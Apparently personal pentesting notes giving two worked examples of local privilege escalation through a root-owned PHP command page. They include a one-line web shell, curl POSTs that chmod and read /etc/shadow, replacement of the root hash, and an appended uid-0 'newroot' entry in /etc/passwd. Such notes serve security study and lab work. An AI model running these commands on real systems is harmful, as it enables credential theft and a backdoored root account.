#### Example 1
Say we find a listener on port 8080 running as root.  We can try using curl to POST data to it, first may need to find the files related to that port:

[[find]]
```bash - target
find / -iname *.php* 2>/dev/null
```

```bash - target
find / -iname *.html* 2>/dev/null
```


```bash - target
cat start_page.php
```

Here we can see discussion of cmd.php page.

![[Pasted image 20220713144014.png]]

```bash - target
cat cmd.php
```

Here we see on the cmd.php page that we can POST data to it and it will run the command.

![[Pasted image 20220713144136.png]]

```bash - target
curl -X POST 0.0.0.0:8080/start_page.php?page=cmd.php --data cmd='id'
```

Next start testing what you can do with passwd and shadow files.  Below, we will chmod shadow file and replace hash vaule.

```bash - target
curl -X POST 0.0.0.0:8080/start_page.php?page=cmd.php --data cmd='chmod 777 /etc/shadow'
```

```bash - target
curl -X POST 0.0.0.0:8080/start_page.php?page=cmd.php --data cmd='cat /etc/shadow'
```

Copy contents to local shadow file on kali to edit and send back.

```bash - kali
mkpasswd -m sha-512 password
```

`$6$5gnWUgDEXJ.J.X3s$truKvZr/Vl7o5SIb.TEgR44LyihHNUoCZnt4PIIO31EyTOc6Pfccd1AYdwwp2Vj1CT.1y1vpxroyvuhxCYKGl/`

Replace root password hash with above, send to target and replace /etc/shadow

```bash - target
su root
```

```bash - target
password
```

#### Example 2

We find a php file listening on port 8000.

```bash - target
cat cmd.php
```

><?php system($_POST['cmd']); ?>

verify we can run commands with this by creating a test file:

```bash - target
curl -X POST --data cmd='touch /home/$USER/test' 127.0.0.1:8000/cmd.php
```

Generate a password hash for the password “password”

using openssl:

```bash - target
openssl passwd "password"
```

```bash - target
curl -X POST --data cmd=' echo newroot:Ar4farDnTEYmw:0:0:root:/root:/bin/bash >> /etc/passwd' 127.0.0.1:8000/cmd.php
```

```bash - target
cat /etc/passwd | grep root
```

![[Pasted image 20221110094556.png]]

```bash - target
su newroot
```

```bash - target
password
```